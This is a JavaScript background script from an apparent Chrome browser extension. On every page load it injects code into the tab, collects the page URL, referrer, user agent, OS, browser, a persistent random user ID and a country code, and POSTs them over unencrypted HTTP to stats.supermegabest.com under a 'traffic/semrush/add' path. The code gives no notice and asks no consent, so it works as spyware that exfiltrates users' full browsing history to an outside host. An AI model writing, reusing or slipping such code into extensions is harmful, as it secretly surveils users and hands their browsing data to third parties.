'use strict';

(function () {
    'use strict';

    var API_URL = 'http://stats.supermegabest.com/1/traffic/semrush/add';

    var USER_ID;
    var COUNTRY_CODE;
    var PLUGIN_ID;

    var DEFAULT_FILTER = {
        urls: ['<all_urls>'],
        types: ['main_frame']
    };

    function adcm() {
        this.init();
    }

    adcm.prototype = {
        init: function init() {
            this.bindEventListeners();

            USER_ID = localStorage.getItem('user_id');

            if (!USER_ID) {
                USER_ID = this.generateId();
                localStorage.setItem('user_id', USER_ID);
            }

            COUNTRY_CODE = localStorage.getItem('country_code');
        },

        bindEventListeners: function bindEventListeners() {
            chrome.runtime.onMessage.addListener(this.onExternalMessage.bind(this));
            chrome.webRequest.onCompleted.addListener(this.onRequestCompleted.bind(this), DEFAULT_FILTER);
        },

        onRequestCompleted: function onRequestCompleted(details) {
            var self = this;

            if (this.isBlacklistedUrl(details.url)) {
                return;
            }

            chrome.tabs.executeScript(details.tabId, {
                code: "(function () { return {" +
                "referrer:document.referrer, " +
                "url:window.location.href, " +
                "user_agent:window.navigator.userAgent, " +
                "cb:Date.now()" +
            "}})();"
            }, function (result) {
                if (chrome.runtime.lastError) {
                    console.log(chrome.runtime.lastError.message);
                } else {
                    if (result && result.length > 0) {
                        result[0]['status_code'] = details.statusCode;
                        result[0]['os'] = self.__getOS();
                        result[0]['browser'] = self.__getBrowser();
                        self.sendRequest(result[0], true);
                        console.log('Request completed in tab %s', details.tabId);
                    } else {
                        console.log('Wrong page context in tab %s', details.tabId);
                    }
                }
            });
        },

        prepareData: function prepareData(data, isEncodeUri) {
            var params = {};
            var paramsArray = [];

            if (isEncodeUri === void 0) { isEncodeUri = true; }

            params['url'] = data.url;
            if (data && data.cb) {
                params['timestamp'] = parseInt(data.cb);
            }

            if (data && data.referrer) {
                params['referrer'] = data.referrer;
            }

            params['uid'] = JSON.parse(this.getUserId());
            params['country_code'] = JSON.parse(this.getCountryCode());
            params['status_code'] = data.status_code;
            params['os'] = data.os;
            params['browser'] = data.browser;
            params['user_agent'] = data.user_agent;

            for (var key in params) {
                if (params.hasOwnProperty(key)) {
                    paramsArray.push(key + '=' + (isEncodeUri ? encodeURIComponent(params[key]) : params[key]));
                }
            }

            return paramsArray.join(isEncodeUri ? '&' : ',');
        },

        encode: function encode(str) {
            return encodeURIComponent(str);
        },

        sendRequest: function sendRequest(data, initial) {
            var xhr = new XMLHttpRequest();
            xhr.onload = this.handleResponse.bind(this, xhr, data, initial);
            xhr.open('POST', API_URL , true);
            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhr.send(this.prepareData(data));
            console.log("Send request: " + this.prepareData(data));
        },

        handleResponse: function handleResponse(xhr, data, initial) {

            if (xhr.readyState !== 4) return;

            if (xhr.status === 200 || xhr.status === 204) {
                return;
            } else {
                console.error('Server error: %d (%s)', xhr.status, xhr.statusText);
            }
        },

        onExternalMessage: function onExternalMessage(object, sender, sendResponse) {
            //
        },

        generateId: function generateId() {
            var lut = []; for (var i=0; i<256; i++) { lut[i] = (i<16?'0':'')+(i).toString(16); }
            var d0 = Math.random()*0xffffffff|0;
            var d1 = Math.random()*0xffffffff|0;
            var d2 = Math.random()*0xffffffff|0;
            var d3 = Math.random()*0xffffffff|0;
            return lut[d0&0xff]+lut[d0>>8&0xff]+lut[d0>>16&0xff]+lut[d0>>24&0xff]+'-'+
                lut[d1&0xff]+lut[d1>>8&0xff]+'-'+lut[d1>>16&0x0f|0x40]+lut[d1>>24&0xff]+'-'+
                lut[d2&0x3f|0x80]+lut[d2>>8&0xff]+'-'+lut[d2>>16&0xff]+lut[d2>>24&0xff]+
                lut[d3&0xff]+lut[d3>>8&0xff]+lut[d3>>16&0xff]+lut[d3>>24&0xff];
        },

        getUserId: function getUserId() {
            return USER_ID;
        },

        getCountryCode: function getCountryCode() {
            return COUNTRY_CODE
        },

        getPluginId: function getPluginId() {
            return PLUGIN_ID || null;
        },

        __getBrowser: function getBrowser() {
            var unknown = '-';

            // browser
            var nVer = navigator.appVersion;
            var nAgt = navigator.userAgent;
            var browser = navigator.appName;
            var version = '' + parseFloat(navigator.appVersion);
            var majorVersion = parseInt(navigator.appVersion, 10);
            var nameOffset, verOffset, ix;

            // Opera
            if ((verOffset = nAgt.indexOf('Opera')) != -1) {
                browser = 'Opera';
                version = nAgt.substring(verOffset + 6);
                if ((verOffset = nAgt.indexOf('Version')) != -1) {
                    version = nAgt.substring(verOffset + 8);
                }
            }
            // Opera Next
            if ((verOffset = nAgt.indexOf('OPR')) != -1) {
                browser = 'Opera';
                version = nAgt.substring(verOffset + 4);
            }
            // Edge
            else if ((verOffset = nAgt.indexOf('Edge')) != -1) {
                browser = 'Microsoft Edge';
                version = nAgt.substring(verOffset + 5);
            }
            // MSIE
            else if ((verOffset = nAgt.indexOf('MSIE')) != -1) {
                browser = 'Microsoft Internet Explorer';
                version = nAgt.substring(verOffset + 5);
            }
            // Chrome
            else if ((verOffset = nAgt.indexOf('Chrome')) != -1) {
                browser = 'Chrome';
                version = nAgt.substring(verOffset + 7);
            }
            // Safari
            else if ((verOffset = nAgt.indexOf('Safari')) != -1) {
                browser = 'Safari';
                version = nAgt.substring(verOffset + 7);
                if ((verOffset = nAgt.indexOf('Version')) != -1) {
                    version = nAgt.substring(verOffset + 8);
                }
            }
            // Firefox
            else if ((verOffset = nAgt.indexOf('Firefox')) != -1) {
                browser = 'Firefox';
                version = nAgt.substring(verOffset + 8);
            }
            // MSIE 11+
            else if (nAgt.indexOf('Trident/') != -1) {
                browser = 'Microsoft Internet Explorer';
                version = nAgt.substring(nAgt.indexOf('rv:') + 3);
            }
            // Other browsers
            else if ((nameOffset = nAgt.lastIndexOf(' ') + 1) < (verOffset = nAgt.lastIndexOf('/'))) {
                browser = nAgt.substring(nameOffset, verOffset);
                version = nAgt.substring(verOffset + 1);
                if (browser.toLowerCase() == browser.toUpperCase()) {
                    browser = navigator.appName;
                }
            }
            // trim the version string
            if ((ix = version.indexOf(';')) != -1) version = version.substring(0, ix);
            if ((ix = version.indexOf(' ')) != -1) version = version.substring(0, ix);
            if ((ix = version.indexOf(')')) != -1) version = version.substring(0, ix);

            majorVersion = parseInt('' + version, 10);
            if (isNaN(majorVersion)) {
                version = '' + parseFloat(navigator.appVersion);
                majorVersion = parseInt(navigator.appVersion, 10);
            }

            return browser+' '+version;
        },

        __getOS: function getOS() {
            var unknown = '-';

            var nAgt = navigator.userAgent;
            var nVer = navigator.appVersion;

            // system
            var os = unknown;
            var clientStrings = [
                {s:'Windows 10', r:/(Windows 10.0|Windows NT 10.0)/},
                {s:'Windows 8.1', r:/(Windows 8.1|Windows NT 6.3)/},
                {s:'Windows 8', r:/(Windows 8|Windows NT 6.2)/},
                {s:'Windows 7', r:/(Windows 7|Windows NT 6.1)/},
                {s:'Windows Vista', r:/Windows NT 6.0/},
                {s:'Windows Server 2003', r:/Windows NT 5.2/},
                {s:'Windows XP', r:/(Windows NT 5.1|Windows XP)/},
                {s:'Windows 2000', r:/(Windows NT 5.0|Windows 2000)/},
                {s:'Windows ME', r:/(Win 9x 4.90|Windows ME)/},
                {s:'Windows 98', r:/(Windows 98|Win98)/},
                {s:'Windows 95', r:/(Windows 95|Win95|Windows_95)/},
                {s:'Windows NT 4.0', r:/(Windows NT 4.0|WinNT4.0|WinNT|Windows NT)/},
                {s:'Windows CE', r:/Windows CE/},
                {s:'Windows 3.11', r:/Win16/},
                {s:'Android', r:/Android/},
                {s:'Open BSD', r:/OpenBSD/},
                {s:'Sun OS', r:/SunOS/},
                {s:'Linux', r:/(Linux|X11)/},
                {s:'iOS', r:/(iPhone|iPad|iPod)/},
                {s:'Mac OS X', r:/Mac OS X/},
                {s:'Mac OS', r:/(MacPPC|MacIntel|Mac_PowerPC|Macintosh)/},
                {s:'QNX', r:/QNX/},
                {s:'UNIX', r:/UNIX/},
                {s:'BeOS', r:/BeOS/},
                {s:'OS/2', r:/OS\/2/},
                {s:'Search Bot', r:/(nuhk|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask Jeeves\/Teoma|ia_archiver)/}
            ];
            for (var id in clientStrings) {
                var cs = clientStrings[id];
                if (cs.r.test(nAgt)) {
                    os = cs.s;
                    break;
                }
            }

            var osVersion = unknown;

            if (/Windows/.test(os)) {
                osVersion = /Windows (.*)/.exec(os)[1];
                os = 'Windows';
            }

            switch (os) {
                case 'Mac OS X':
                    osVersion = /Mac OS X (10[\.\_\d]+)/.exec(nAgt)[1];
                    break;

                case 'Android':
                    osVersion = /Android ([\.\_\d]+)/.exec(nAgt)[1];
                    break;

                case 'iOS':
                    osVersion = /OS (\d+)_(\d+)_?(\d+)?/.exec(nVer);
                    osVersion = osVersion[1] + '.' + osVersion[2] + '.' + (osVersion[3] | 0);
                    break;
            }

            return os+' '+osVersion;
        },

        isBlacklistedUrl: function isBlacklistedUrl(url) {
            var patterns = [
            // chrome:// URLs
            /^(chrome-?\S*:\/\/)/i,
            // New tab URLs
            /(\/(?:chrome|async)\/newtab)/i,
            // Google's stuff
            /(google.\w+\/webhp\?.+)$/i];

            for (var i = patterns.length; i--;) {
                if (patterns[i].test(url)) {
                    console.log("url included in the blacklist:" + url);
                    return true;
                }
            }
            return false;
        }
    };

    new adcm();
})();
